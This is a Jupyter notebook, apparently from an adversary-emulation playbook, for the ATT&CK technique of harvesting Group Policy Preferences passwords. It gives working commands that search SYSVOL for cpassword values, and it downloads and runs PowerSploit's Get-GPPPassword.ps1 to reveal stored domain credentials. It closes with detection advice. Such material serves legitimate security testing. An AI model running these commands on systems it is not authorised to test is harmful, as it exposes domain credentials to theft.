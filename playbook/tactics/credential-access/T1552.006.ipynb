{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "c6732709",
   "metadata": {},
   "source": "# T1552.006 - Group Policy Preferences\nAdversaries may attempt to find unsecured credentials in Group Policy Preferences (GPP). GPP are tools that allow administrators to create domain policies with embedded credentials. These policies allow administrators to set local accounts.(Citation: Microsoft GPP 2016)\n\nThese group policies are stored in SYSVOL on a domain controller. This means that any domain user can view the SYSVOL share and decrypt the password (using the AES key that has been made public).(Citation: Microsoft GPP Key)\n\nThe following tools and scripts can be used to gather and decrypt the password file from Group Policy Preference XML files:\n\n* Metasploit\u2019s post exploitation module: <code>post/windows/gather/credentials/gpp</code>\n* Get-GPPPassword(Citation: Obscuresecurity Get-GPPPassword)\n* gpprefdecrypt.py\n\nOn the SYSVOL share, adversaries may use the following command to enumerate potential GPP XML files: <code>dir /s * .xml</code>\n"
  },
  {
   "cell_type": "markdown",
   "id": "3dae13a3",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "1c11aa7a",
   "metadata": {},
   "source": "### Atomic Test #1 - GPP Passwords (findstr)\nLook for the encrypted cpassword value within Group Policy Preference files on the Domain Controller. This value can be decrypted with gpp-decrypt on Kali Linux.\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: Computer must be domain joined\n\n##### Check Prereq Commands:\n```cmd\nif((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```cmd\nWrite-Host Joining this computer to a domain must be done manually\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "dbc10545",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1552.006 -TestNumbers 1 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "34cce1e8",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nfindstr /S cpassword %logonserver%\\sysvol\\*.xml\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "30ffd2d7",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1552.006 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "abb5766a",
   "metadata": {},
   "source": "### Atomic Test #2 - GPP Passwords (Get-GPPPassword)\nLook for the encrypted cpassword value within Group Policy Preference files on the Domain Controller.\nThis test is intended to be run from a domain joined workstation, not on the Domain Controller itself.\nThe Get-GPPPasswords.ps1 executed during this test can be obtained using the get-prereq_commands.\n\nSuccessful test execution will either display the credentials found in the GPP files or indicate \"No preference files found\".\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: Get-GPPPassword PowerShell Script must exist at #{gpp_script_path}\n\n##### Check Prereq Commands:\n```powershell\nif(Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\Get-GPPPassword.ps1\") {exit 0 } else {exit 1 }\n\n```\n##### Get Prereq Commands:\n```powershell\nNew-Item -ItemType Directory (Split-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\Get-GPPPassword.ps1\") -Force | Out-Null\nInvoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/87630cac639f29c2adcb163f661f02890adf4bdd/Exfiltration/Get-GPPPassword.ps1 -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\Get-GPPPassword.ps1\"\n\n```\n##### Description: Computer must be domain joined\n\n##### Check Prereq Commands:\n```powershell\nif((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nWrite-Host Joining this computer to a domain must be done manually\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c6d812f6",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1552.006 -TestNumbers 2 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "32ae3399",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n. \"PathToAtomicsFolder\\..\\ExternalPayloads\\Get-GPPPassword.ps1\"\nGet-GPPPassword -Verbose\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5657b2da",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1552.006 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "3c1fc862",
   "metadata": {},
   "source": "## Detection\nMonitor for attempts to access SYSVOL that involve searching for XML files. \n\nDeploy a new XML file with permissions set to Everyone:Deny and monitor for Access Denied errors.(Citation: ADSecurity Finding Passwords in SYSVOL)"
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "pwsh",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "pwsh",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}